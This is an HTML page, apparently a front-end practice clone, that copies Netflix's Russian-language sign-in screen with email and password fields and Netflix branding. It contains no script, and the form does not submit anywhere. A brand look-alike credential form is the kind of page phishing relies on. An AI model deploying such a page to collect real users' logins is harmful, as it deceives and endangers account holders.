<!DOCTYPE html>
<html lang="ru">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="/assets/style.css">
    <title>Netflix</title>
</head>

<body>

    <login>
        <login-wraper>
            <login-background>
                <!--<img class="login-image" src="/img/main.jpg" alt="">-->
            </login-background>
            <login-header>

            </login-header>
            <login-body>
                <div class="body-margin"></div>
                <div class="login-content">
                    <div class="login-form-main">
                        <h1 class="login-form-main-title">Авторизация</h1>
                        <form action="post">
                            <div class="login-control-container">
                                <input type="email" placeholder="Введите email" class="login-control">
                            </div>
                            <div class="login-control-container">
                                <input type="password" placeholder="Введите пароль" class="login-control">
                            </div>
                            <button class="btn-signIn w-100 btn-login">Войти</button>
                            <div class="login-footer">
                                <input type="checkbox" class="custom-checkbox" name="" id="checkLog">
                                <label class="login-checkbox-label" for="checkLog">Запомнить это устройство</label>
                            </div>
                            <div class="login-footer-other"></div>
                        </form>
                    </div>
                </div>
            </login-body>

            <login-footer>
                <div style="    -webkit-text-size-adjust: 100%;
                -webkit-font-smoothing: antialiased;
                direction: ltr;
                font-family: Netflix Sans,Helvetica Neue,Segoe UI,Roboto,Ubuntu,sans-serif;
                color: #757575;
                font-size: 1em;
                letter-spacing: 0!important;
                border-top: 1px solid #e5e5e5;
                height: 0;
                width: 100%;
                display: none;
                border-color: #737373;"></div>
                <site-footer>
                    <p class="footer-top"><a class="footer-top-a" href="https://help.netflix.com/contactus">Questions? Contact us.</a></p>
                </site-footer>
            </login-footer>
            
        </login-wraper>
        
    </login>
    

</body>

</html>
